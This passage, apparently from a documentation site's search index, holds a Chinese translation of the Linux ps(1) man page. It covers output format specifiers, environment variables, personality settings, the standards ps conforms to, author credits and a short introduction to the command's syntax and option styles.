egroup\uff09\u3002 ignored IGNORED \u88ab\u5ffd\u7565\u4fe1\u53f7\u7684\u63a9\u7801\uff0c\u53c2\u89c1 signal(7)\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig_ignore, sigignore\uff09\u3002 ipcns IPCNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 label LABEL \u5b89\u5168\u6807\u7b7e\uff0c\u6700\u5e38\u7528\u4e8e SELinux \u4e0a\u4e0b\u6587\u6570\u636e\u3002\u8fd9\u9002\u7528\u4e8e\u9ad8\u5b89\u5168\u7cfb\u7edf\u4e0a\u7684\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\uff08\u201cMAC\u201d\uff09\u3002 lstart STARTED \u547d\u4ee4\u542f\u52a8\u65f6\u95f4\u3002\u53c2\u89c1 bsdstart\u3001start\u3001start_time \u548c stime\u3002 lsession SESSION \u663e\u793a\u8fdb\u7a0b\u7684\u767b\u5f55\u4f1a\u8bdd\u6807\u8bc6\u7b26\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 luid LUID \u663e\u793a\u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u767b\u5f55 ID\u3002 lwp LWP \u53ef\u8c03\u5ea6\u5b9e\u4f53\u7684\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff08\u7ebf\u7a0b\uff09ID\uff08\u522b\u540d spid, tid\uff09\u3002\u53c2\u89c1 tid \u83b7\u53d6\u5176\u4ed6\u4fe1\u606f\u3002 lxc LXC \u663e\u793a\u4efb\u52a1\u8fd0\u884c\u6240\u5728\u7684 lxc \u5bb9\u5668\u540d\u79f0\u3002\u5982\u679c\u8fdb\u7a0b\u672a\u5728\u5bb9\u5668\u5185\u8fd0\u884c\uff0c\u5219\u663e\u793a\u4e00\u4e2a\u7834\u6298\u53f7\uff08\u2018-\u2019\uff09\u3002 machine MACHINE \u663e\u793a\u5206\u914d\u7ed9 VM \u6216\u5bb9\u5668\u7684\u8fdb\u7a0b\u7684\u673a\u5668\u540d\u79f0\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 maj_flt MAJFLT \u6b64\u8fdb\u7a0b\u53d1\u751f\u7684\u4e3b\u8981\u9875\u9762\u9519\u8bef\u6570\u3002 min_flt MINFLT \u6b64\u8fdb\u7a0b\u53d1\u751f\u7684\u6b21\u8981\u9875\u9762\u9519\u8bef\u6570\u3002 mntns MNTNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 netns NETNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 ni NI nice \u503c\u3002\u8303\u56f4\u4ece 19\uff08\u6700\u53cb\u597d\uff09\u5230 -20\uff08\u5bf9\u5176\u4ed6\u7528\u6237\u4e0d\u53cb\u597d\uff09\uff0c\u53c2\u89c1 nice(1)\u3002\uff08\u522b\u540d nice\uff09\u3002 nice NI \u53c2\u89c1 ni\u3002\uff08\u522b\u540d ni\uff09\u3002 nlwp NLWP \u8fdb\u7a0b\u4e2d\u7684 lwps\uff08\u7ebf\u7a0b\uff09\u6570\u91cf\u3002\uff08\u522b\u540d thcount\uff09\u3002 numa NUMA \u4e0e\u6700\u8fd1\u4f7f\u7528\u7684\u5904\u7406\u5668\u76f8\u5173\u8054\u7684\u8282\u70b9\u3002-1 \u8868\u793a NUMA \u4fe1\u606f\u4e0d\u53ef\u7528\u3002 nwchan WCHAN \u8fdb\u7a0b\u6b63\u5728\u4f11\u7720\u7684\u5185\u6838\u51fd\u6570\u7684\u5730\u5740\uff08\u5982\u679c\u60a8\u60f3\u8981\u5185\u6838\u51fd\u6570\u540d\u79f0\uff0c\u8bf7\u4f7f\u7528 wchan\uff09\u3002\u8fd0\u884c\u4e2d\u7684\u4efb\u52a1\u5c06\u5728\u6b64\u5217\u4e2d\u663e\u793a\u4e00\u4e2a\u7834\u6298\u53f7\uff08\u2018-\u2019\uff09\u3002 ouid OWNER \u663e\u793a\u8fdb\u7a0b\u4f1a\u8bdd\u6240\u6709\u8005\u7684 Unix \u7528\u6237\u6807\u8bc6\u7b26\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 pcpu %CPU \u53c2\u89c1 %cpu\u3002\uff08\u522b\u540d %cpu\uff09\u3002 pending PENDING \u6302\u8d77\u4fe1\u53f7\u7684\u63a9\u7801\u3002\u53c2\u89c1 signal(7)\u3002\u6302\u8d77\u5728\u8fdb\u7a0b\u4e0a\u7684\u4fe1\u53f7\u4e0e\u6302\u8d77\u5728\u5355\u4e2a\u7ebf\u7a0b\u4e0a\u7684\u4fe1\u53f7\u4e0d\u540c\u3002\u4f7f\u7528 m \u9009\u9879\u6216 -m \u9009\u9879\u67e5\u770b\u4e24\u8005\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig\uff09\u3002 pgid PGID \u8fdb\u7a0b\u7ec4 ID\uff0c\u6216\u76f8\u5f53\u4e8e\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u8005\u7684\u8fdb\u7a0b ID\u3002\uff08\u522b\u540d pgrp\uff09\u3002 pgrp PGRP \u53c2\u89c1 pgid\u3002\uff08\u522b\u540d pgid\uff09\u3002 pid PID \u8868\u793a\u8fdb\u7a0b ID \u7684\u6570\u5b57\uff08\u522b\u540d tgid\uff09\u3002 pidns PIDNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 pmem %MEM \u53c2\u89c1 %mem\u3002\uff08\u522b\u540d %mem\uff09\u3002 policy POL \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7c7b\u3002\uff08\u522b\u540d class, cls\uff09\u3002\u53ef\u80fd\u7684\u503c\u4e3a\uff1a - \u672a\u62a5\u544a TS SCHED_OTHER FF SCHED_FIFO RR SCHED_RR B SCHED_BATCH ISO SCHED_ISO IDL SCHED_IDLE DLN SCHED_DEADLINE ? \u672a\u77e5\u503c ppid PPID \u7236\u8fdb\u7a0b ID\u3002 pri PRI \u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\u3002\u6570\u503c\u8d8a\u9ad8\uff0c\u4f18\u5148\u7ea7\u8d8a\u4f4e\u3002 psr PSR \u5f53\u524d\u5206\u914d\u7ed9\u8fdb\u7a0b\u7684\u5904\u7406\u5668\u3002 rgid RGID \u5b9e\u9645\u7ec4 ID\u3002 rgroup RGROUP \u5b9e\u9645\u7ec4\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 rss RSS \u5e38\u9a7b\u96c6\u5927\u5c0f\uff0c\u4efb\u52a1\u4f7f\u7528\u7684\u975e\u4ea4\u6362\u7269\u7406\u5185\u5b58\uff08\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u3002\uff08\u522b\u540d rssize, rsz\uff09\u3002 rssize RSS \u53c2\u89c1 rss\u3002\uff08\u522b\u540d rss, rsz\uff09\u3002 rsz RSZ \u53c2\u89c1 rss\u3002\uff08\u522b\u540d rss, rssize\uff09\u3002 rtprio RTPRIO \u5b9e\u65f6\u4f18\u5148\u7ea7\u3002 ruid RUID \u5b9e\u9645\u7528\u6237 ID\u3002 ruser RUSER \u5b9e\u9645\u7528\u6237 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 s S \u6700\u5c0f\u72b6\u6001\u663e\u793a\uff08\u4e00\u4e2a\u5b57\u7b26\uff09\u3002\u6709\u5173\u4e0d\u540c\u503c\u7684\u542b\u4e49\uff0c\u8bf7\u53c2\u89c1\u8fdb\u7a0b\u72b6\u6001\u4ee3\u7801\u90e8\u5206\u3002\u53c2\u89c1 stat \u4ee5\u663e\u793a\u5176\u4ed6\u4fe1\u606f\u3002\uff08\u522b\u540d state\uff09\u3002 sched SCH \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7b56\u7565\u3002\u8c03\u5ea6\u7b56\u7565 SCHED_OTHER (SCHED_NORMAL), SCHED_FIFO, SCHED_RR, SCHED_BATCH, SCHED_ISO, SCHED_IDLE \u548c SCHED_DEADLINE \u5206\u522b\u663e\u793a\u4e3a 0, 1, 2, 3, 4, 5 \u548c 6\u3002 seat SEAT \u663e\u793a\u4e0e\u7279\u5b9a\u5de5\u4f5c\u533a\u5206\u914d\u7684\u6240\u6709\u786c\u4ef6\u8bbe\u5907\u76f8\u5173\u8054\u7684\u6807\u8bc6\u7b26\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 sess SESS \u4f1a\u8bdd ID\uff0c\u6216\u76f8\u5f53\u4e8e\u4f1a\u8bdd\u9886\u5bfc\u8005\u7684\u8fdb\u7a0b ID\u3002\uff08\u522b\u540d session, sid\uff09\u3002 sgi_p P \u8fdb\u7a0b\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u5904\u7406\u5668\u3002\u663e\u793a\u201c*\u201d\u5982\u679c\u8fdb\u7a0b\u5f53\u524d\u672a\u8fd0\u884c\u6216\u4e0d\u53ef\u8fd0\u884c\u3002 sgid SGID \u4fdd\u5b58\u7684\u7ec4 ID\u3002\uff08\u522b\u540d svgid\uff09\u3002 sgroup SGROUP \u4fdd\u5b58\u7684\u7ec4\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 sid SID \u53c2\u89c1 sess\u3002\uff08\u522b\u540d sess, session\uff09\u3002 sig PENDING \u53c2\u89c1 pending\u3002\uff08\u522b\u540d pending, sig_pend\uff09\u3002 sigcatch CAUGHT \u53c2\u89c1 caught\u3002\uff08\u522b\u540d caught, sig_catch\uff09\u3002 sigignore IGNORED \u53c2\u89c1 ignored\u3002\uff08\u522b\u540d ignored, sig_ignore\uff09\u3002 sigmask BLOCKED \u53c2\u89c1 blocked\u3002\uff08\u522b\u540d blocked, sig_block\uff09\u3002 size SIZE \u8fdb\u7a0b\u4f7f\u7528\u7684\u8fd1\u4f3c\u4ea4\u6362\u7a7a\u95f4\u5927\u5c0f\uff08\u5982\u679c\u8fdb\u7a0b\u5c06\u6240\u6709\u53ef\u5199\u9875\u9762\u5f04\u810f\u7136\u540e\u88ab\u4ea4\u6362\u51fa\u53bb\uff09\u3002\u8fd9\u4e2a\u6570\u5b57\u975e\u5e38\u7c97\u7565\uff01 slice SLICE \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u5207\u7247\u5355\u5143\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 spid SPID \u53c2\u89c1 lwp\u3002\uff08\u522b\u540d lwp, tid\uff09\u3002 stackp STACKP \u8fdb\u7a0b\u6808\u5e95\uff08\u5f00\u59cb\uff09\u5730\u5740\u3002 start STARTED \u547d\u4ee4\u542f\u52a8\u65f6\u95f4\u3002\u5982\u679c\u8fdb\u7a0b\u5728\u8fc7\u53bb 24 \u5c0f\u65f6\u5185\u542f\u52a8\uff0c\u8f93\u51fa\u683c\u5f0f\u4e3a\u201cHH:MM:SS\u201d\uff0c\u5426\u5219\u4e3a\u201c Mmm dd\u201d\uff08\u5176\u4e2d Mmm \u662f\u4e09\u5b57\u6bcd\u6708\u4efd\u540d\u79f0\uff09\u3002\u53c2\u89c1 lstart\u3001bsdstart\u3001start_time \u548c stime\u3002 start_time START \u8fdb\u7a0b\u7684\u542f\u52a8\u65f6\u95f4\u6216\u65e5\u671f\u3002\u4ec5\u5f53\u8fdb\u7a0b\u672a\u5728\u8c03\u7528 ps \u7684\u540c\u4e00\u5e74\u542f\u52a8\u65f6\uff0c\u624d\u4f1a\u663e\u793a\u5e74\u4efd\uff0c\u6216\u201c MmmDD\u201d\uff08\u5982\u679c\u4e0d\u662f\u540c\u4e00\u5929\u542f\u52a8\uff09\uff0c\u6216\u201cHH:MM\u201d\uff08\u5426\u5219\uff09\u3002\u53c2\u89c1 bsdstart\u3001start\u3001lstart \u548c stime\u3002 stat STAT \u591a\u5b57\u7b26\u8fdb\u7a0b\u72b6\u6001\u3002\u6709\u5173\u4e0d\u540c\u503c\u7684\u542b\u4e49\uff0c\u8bf7\u53c2\u89c1\u8fdb\u7a0b\u72b6\u6001\u4ee3\u7801\u90e8\u5206\u3002\u53c2\u89c1 s \u548c state \u5982\u679c\u60a8\u53ea\u60f3\u663e\u793a\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\uff08\u522b\u540d state\uff09\u3002 state S \u53c2\u89c1 s\u3002\uff08\u522b\u540d s\uff09\u3002 stime STIME \u53c2\u89c1 start_time\u3002\uff08\u522b\u540d start_time\uff09\u3002 suid SUID \u4fdd\u5b58\u7684\u7528\u6237 ID\u3002\uff08\u522b\u540d svuid\uff09\u3002 supgid SUPGID \u8865\u5145\u7ec4\u7684\u7ec4 ID\uff08\u5982\u679c\u6709\uff09\u3002\u53c2\u89c1 getgroups(2)\u3002 supgrp SUPGRP \u8865\u5145\u7ec4\u7684\u7ec4\u540d\uff08\u5982\u679c\u6709\uff09\u3002\u53c2\u89c1 getgroups(2)\u3002 suser SUSER \u4fdd\u5b58\u7684\u7528\u6237\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d svuser\uff09\u3002 svgid SVGID \u53c2\u89c1 sgid\u3002\uff08\u522b\u540d sgid\uff09\u3002 svuid SVUID \u53c2\u89c1 suid\u3002\uff08\u522b\u540d suid\uff09\u3002 sz SZ \u8fdb\u7a0b\u7684\u6838\u5fc3\u6620\u50cf\u7684\u7269\u7406\u9875\u9762\u5927\u5c0f\u3002\u8fd9\u5305\u62ec\u6587\u672c\u3001\u6570\u636e\u548c\u6808\u7a7a\u95f4\u3002\u8bbe\u5907\u6620\u5c04\u5f53\u524d\u88ab\u6392\u9664\uff1b\u6b64\u72b6\u51b5\u53ef\u80fd\u4f1a\u66f4\u6539\u3002\u53c2\u89c1 vsz \u548c rss\u3002 tgid TGID \u8868\u793a\u4efb\u52a1\u6240\u5c5e\u7684\u7ebf\u7a0b\u7ec4\u7684\u6570\u5b57\uff08\u522b\u540d pid\uff09\u3002\u5b83\u662f\u7ebf\u7a0b\u7ec4\u9886\u5bfc\u8005\u7684\u8fdb\u7a0b ID\u3002 thcount THCNT \u53c2\u89c1 nlwp\u3002\uff08\u522b\u540d nlwp\uff09\u3002\u8fdb\u7a0b\u62e5\u6709\u7684\u5185\u6838\u7ebf\u7a0b\u6570\u91cf\u3002 tid TID \u8868\u793a\u53ef\u8c03\u5ea6\u5b9e\u4f53\u7684\u552f\u4e00\u7f16\u53f7\uff08\u522b\u540d lwp, spid\uff09\u3002\u6b64\u503c\u4e5f\u53ef\u80fd\u663e\u793a\u4e3a\uff1a\u8fdb\u7a0b ID (pid)\uff1b\u8fdb\u7a0b\u7ec4 ID (pgrp)\uff1b\u4f1a\u8bdd ID\uff08\u5bf9\u4e8e\u4f1a\u8bdd\u9886\u5bfc\u8005\uff09(sid)\uff1b\u7ebf\u7a0b\u7ec4 ID\uff08\u5bf9\u4e8e\u7ebf\u7a0b\u7ec4\u9886\u5bfc\u8005\uff09(tgid)\uff1b\u4ee5\u53ca tty \u8fdb\u7a0b\u7ec4 ID\uff08\u5bf9\u4e8e\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u8005\uff09(tpgid)\u3002 time TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u201c[DD-]HH:MM:SS\u201d\u683c\u5f0f\u3002\uff08\u522b\u540d cputime\uff09\u3002 times TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d times TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff08\u522b\u540d cputimes\uff09\u3002 tname TTY \u63a7\u5236 tty\uff08\u7ec8\u7aef\uff09\u3002\uff08\u522b\u540d tt, tty\uff09\u3002 tpgid TPGID \u8fde\u63a5\u5230 tty\uff08\u7ec8\u7aef\uff09\u7684\u524d\u53f0\u8fdb\u7a0b\u7ec4\u7684 ID\uff0c\u5982\u679c\u8fdb\u7a0b\u672a\u8fde\u63a5\u5230 tty\uff0c\u5219\u4e3a -1\u3002 trs TRS \u6587\u672c\u5e38\u9a7b\u96c6\u5927\u5c0f\uff0c\u5206\u914d\u7ed9\u53ef\u6267\u884c\u4ee3\u7801\u7684\u7269\u7406\u5185\u5b58\u91cf\u3002 tt TT \u63a7\u5236 tty\uff08\u7ec8\u7aef\uff09\u3002\uff08\u522b\u540d tname, tty\uff09\u3002 tty TT \u63a7\u5236 tty\uff08\u7ec8\u7aef\uff09\u3002\uff08\u522b\u540d tname, tt\uff09\u3002 ucmd CMD \u53c2\u89c1 comm\u3002\uff08\u522b\u540d comm, ucomm\uff09\u3002 ucomm COMMAND \u53c2\u89c1 comm\u3002\uff08\u522b\u540d comm, ucmd\uff09\u3002 uid UID \u53c2\u89c1 euid\u3002\uff08\u522b\u540d euid\uff09\u3002 uname USER \u53c2\u89c1 euser\u3002\uff08\u522b\u540d euser, user\uff09\u3002 unit UNIT \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u5355\u5143\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 user USER \u53c2\u89c1 euser\u3002\uff08\u522b\u540d euser, uname\uff09\u3002 userns USERNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 utsns UTSNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 uunit UUNIT \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u7528\u6237\u5355\u5143\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 vsize VSZ \u53c2\u89c1 vsz\u3002\uff08\u522b\u540d vsz\uff09\u3002 vsz VSZ \u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5927\u5c0f\uff0c\u4ee5 KiB\uff081024 \u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u8868\u793a\u3002\u8bbe\u5907\u6620\u5c04\u5f53\u524d\u88ab\u6392\u9664\uff1b\u6b64\u72b6\u51b5\u53ef\u80fd\u4f1a\u66f4\u6539\u3002\uff08\u522b\u540d vsize\uff09\u3002 wchan WCHAN \u8fdb\u7a0b\u6b63\u5728\u4f11\u7720\u7684\u5185\u6838\u51fd\u6570\u540d\u79f0\uff0c\u5982\u679c\u8fdb\u7a0b\u6b63\u5728\u8fd0\u884c\uff0c\u5219\u4e3a\u201c-\u201d\uff0c\u5982\u679c\u8fdb\u7a0b\u662f\u591a\u7ebf\u7a0b\u4e14 ps \u672a\u663e\u793a\u7ebf\u7a0b\uff0c\u5219\u4e3a\u201c*\u201d\u3002 \u73af\u5883\u53d8\u91cf \u4ee5\u4e0b\u73af\u5883\u53d8\u91cf\u53ef\u80fd\u4f1a\u5f71\u54cd ps\uff1a COLUMNS \u8986\u76d6\u9ed8\u8ba4\u663e\u793a\u5bbd\u5ea6\u3002 LINES \u8986\u76d6\u9ed8\u8ba4\u663e\u793a\u9ad8\u5ea6\u3002 PS_PERSONALITY \u8bbe\u7f6e\u4e3a posix, old, linux, bsd, sun, digital... \u4e4b\u4e00\uff08\u53c2\u89c1\u4e0b\u6587\u4e2a\u6027\u90e8\u5206\uff09\u3002 CMD_ENV \u8bbe\u7f6e\u4e3a posix, old, linux, bsd, sun, digital... \u4e4b\u4e00\uff08\u53c2\u89c1\u4e0b\u6587\u4e2a\u6027\u90e8\u5206\uff09\u3002 I_WANT_A_BROKEN_PS \u5f3a\u5236\u4f7f\u7528\u8fc7\u65f6\u7684\u547d\u4ee4\u884c\u89e3\u91ca\u3002 LC_TIME \u65e5\u671f\u683c\u5f0f\u3002 PS_COLORS \u5f53\u524d\u4e0d\u652f\u6301\u3002 PS_FORMAT \u9ed8\u8ba4\u8f93\u51fa\u683c\u5f0f\u8986\u76d6\u3002\u60a8\u53ef\u4ee5\u5c06\u5176\u8bbe\u7f6e\u4e3a\u7528\u4e8e -o \u9009\u9879\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002DefSysV \u548c DefBSD \u503c\u7279\u522b\u6709\u7528\u3002 POSIXLY_CORRECT \u4e0d\u627e\u501f\u53e3\u5ffd\u7565\u574f\u7684\u201c\u7279\u6027\u201d\u3002 POSIX2 \u8bbe\u7f6e\u4e3a\u201con\u201d\u65f6\uff0c\u8868\u73b0\u4e3a POSIXLY_CORRECT\u3002 UNIX95 \u4e0d\u627e\u501f\u53e3\u5ffd\u7565\u574f\u7684\u201c\u7279\u6027\u201d\u3002 _XPG \u53d6\u6d88 CMD_ENV=irix \u7684\u975e\u6807\u51c6\u884c\u4e3a\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u8bbe\u7f6e\u8fd9\u4e9b\u53d8\u91cf\u662f\u4e2a\u574f\u4e3b\u610f\u3002\u552f\u4e00\u7684\u4f8b\u5916\u662f CMD_ENV \u6216 PS_PERSONALITY\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a Linux \u4ee5\u7528\u4e8e\u6b63\u5e38\u7cfb\u7edf\u3002\u5982\u679c\u6ca1\u6709\u8be5\u8bbe\u7f6e\uff0cps \u5c06\u9075\u5faa Unix98 \u6807\u51c6\u4e2d\u7684\u65e0\u7528\u548c\u4e0d\u826f\u90e8\u5206\u3002 \u4e2a\u6027 390 \u7c7b\u4f3c OS/390 OpenEdition ps aix \u7c7b\u4f3c AIX ps bsd \u7c7b\u4f3c FreeBSD ps\uff08\u5b8c\u5168\u975e\u6807\u51c6\uff09 compaq \u7c7b\u4f3c Digital Unix ps debian \u7c7b\u4f3c\u65e7\u7248 Debian ps digital \u7c7b\u4f3c Tru64\uff08\u66fe\u662f Digital Unix\uff0c\u66fe\u662f OSF/1\uff09ps gnu \u7c7b\u4f3c\u65e7\u7248 Debian ps hp \u7c7b\u4f3c HP-UX ps hpux \u7c7b\u4f3c HP-UX ps irix \u7c7b\u4f3c Irix ps linux ***** \u63a8\u8350 ***** old \u7c7b\u4f3c\u539f\u59cb Linux ps\uff08\u5b8c\u5168\u975e\u6807\u51c6\uff09 os390 \u7c7b\u4f3c OS/390 Open Edition ps posix \u6807\u51c6 s390 \u7c7b\u4f3c OS/390 Open Edition ps sco \u7c7b\u4f3c SCO ps sgi \u7c7b\u4f3c Irix ps solaris2 \u7c7b\u4f3c Solaris 2+ (SunOS 5) ps sunos4 \u7c7b\u4f3c SunOS 4 (Solaris 1) ps\uff08\u5b8c\u5168\u975e\u6807\u51c6\uff09 svr4 \u6807\u51c6 sysv \u6807\u51c6 tru64 \u7c7b\u4f3c Tru64\uff08\u66fe\u662f Digital Unix\uff0c\u66fe\u662f OSF/1\uff09ps unix \u6807\u51c6 unix95 \u6807\u51c6 unix98 \u6807\u51c6 \u53e6\u89c1 pgrep(1), pstree(1), top(1), proc(5). \u6807\u51c6 \u6b64 ps \u7b26\u5408\u4ee5\u4e0b\u6807\u51c6\uff1a 1 \u5355\u4e00 Unix \u89c4\u8303\u7248\u672c 2 2 \u5f00\u653e\u7ec4\u6280\u672f\u6807\u51c6\u57fa\u7840\u89c4\u8303\uff0c\u7b2c 6 \u7248 3 IEEE Std 1003.1, 2004 \u7248 4 X/Open \u7cfb\u7edf\u63a5\u53e3\u6269\u5c55 [UP XSI] 5 ISO/IEC 9945:2003 \u4f5c\u8005 ps \u6700\u521d\u7531 Branko Lankester \u27e8lankeste@fwi.uva.nl\u27e9 \u7f16\u5199\u3002Michael K. Johnson \u27e8johnsonm@redhat.com\u27e9 \u8fdb\u884c\u4e86\u91cd\u5927\u91cd\u5199\u4ee5\u4f7f\u7528 proc \u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u5728\u6b64\u8fc7\u7a0b\u4e2d\u66f4\u6539\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002Michael Shields \u27e8mjshield@nyx.cs.du.edu\u27e9 \u6dfb\u52a0\u4e86 pid \u5217\u8868\u529f\u80fd\u3002Charles Blake \u27e8cblake@bbn.com\u27e9 \u6dfb\u52a0\u4e86\u591a\u7ea7\u6392\u5e8f\u3001dirent \u98ce\u683c\u5e93\u3001\u8bbe\u5907\u540d\u79f0\u5230\u7f16\u53f7\u7684\u6620\u5c04\u6570\u636e\u5e93\u3001 System.map \u4e0a\u7684\u8fd1\u4f3c\u4e8c\u8fdb\u5236\u641c\u7d22\uff0c\u4ee5\u53ca\u8bb8\u591a\u4ee3\u7801\u548c\u6587\u6863\u6e05\u7406\u3002David Mossberger-Tang \u4e3a psupdate \u7f16\u5199\u4e86\u901a\u7528 BFD \u652f\u6301\u3002 Albert Cahalan \u27e8albert@users.sf.net\u27e9 \u91cd\u5199\u4e86 ps \u4ee5\u5b8c\u5168\u652f\u6301 Unix98 \u548c BSD\uff0c\u4ee5\u53ca\u4e00\u4e9b\u4e11\u964b\u7684\u9ed1\u5ba2\u5904\u7406\u8fc7\u65f6\u548c\u5916\u6765\u8bed\u6cd5\u3002 \u8bf7\u5c06\u9519\u8bef\u62a5\u544a\u53d1\u9001\u5230 \u27e8procps@freelists.org\u27e9\u3002\u65e0\u9700\u8ba2\u9605\u6216\u5efa\u8bae\u8ba2\u9605\u3002 procps-ng 2020-06-04 PS(1) https://man7.org/linux/man-pages/man1/ps.1.html","title":"ps\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#ps","text":"ps\u547d\u4ee4\u6765\u81ea\u4e8e\u82f1\u6587\u8bcd\u7ec4\u201dprocess status\u201c\u7684\u7f29\u5199\uff0c\u5176\u529f\u80fd\u662f\u7528\u4e8e\u663e\u793a\u5f53\u524d\u7cfb\u7edf\u7684\u8fdb\u7a0b\u72b6\u6001\u3002\u4f7f\u7528ps\u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4f8b\u5982\u8fdb\u7a0b\u7684\u53f7\u7801\u3001\u53d1\u8d77\u8005\u3001\u7cfb\u7edf\u8d44\u6e90\u4f7f\u7528\u5360\u6bd4\uff08\u5904\u7406\u5668\u4e0e\u5185\u5b58\uff09\u3001\u8fd0\u884c\u72b6\u6001\u7b49\u7b49\u3002\u5e2e\u52a9\u6211\u4eec\u53ca\u65f6\u7684\u53d1\u73b0\u54ea\u4e9b\u8fdb\u7a0b\u51fa\u73b0\u201d\u50f5\u6b7b\u201c\u6216\u201d\u4e0d\u53ef\u4e2d\u65ad\u201c\u7b49\u5f02\u5e38\u60c5\u51b5\u3002 \u8bed\u6cd5\u683c\u5f0f\uff1a ps [\u53c2\u6570]","title":"ps\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#_1","text":"ps\u63a5\u53d7\u4ee5\u4e0b\u51e0\u79cd\u9009\u9879\uff1a UNIX \u9009\u9879\uff0c\u53ef\u4ee5\u5206\u7ec4\uff0c\u5e76\u4e14\u524d\u9762\u5fc5\u987b\u6709\u4e00\u4e2a\u7834\u6298\u53f7\u3002 BSD \u9009\u9879\uff0c\u53ef\u4ee5\u5206\u7ec4\uff0c\u4e0d\u80fd\u4e0e\u7834\u6298\u53f7\u4e00\u8d77\u4f7f\u7528\u3002 GNU\u957f\u9009\u9879\uff0c\u524d\u9762\u6709\u4e24\u4e2a\u7834\u6298\u53f7\u3002 \u4e0d\u540c\u7c7b\u578b\u7684\u9009\u9879\u53ef\u4ee5\u81ea\u7531\u6df7\u5408\uff0c\u4f46\u4e5f\u4f1a\u51fa\u73b0\u51b2\u7a81\u3002\u6709\u4e00\u4e9b\u540c\u4e49\u9009\u9879\u3002\u8be6\u89c1https://man7.org/linux/man-pages/man1/ps.1.html -a 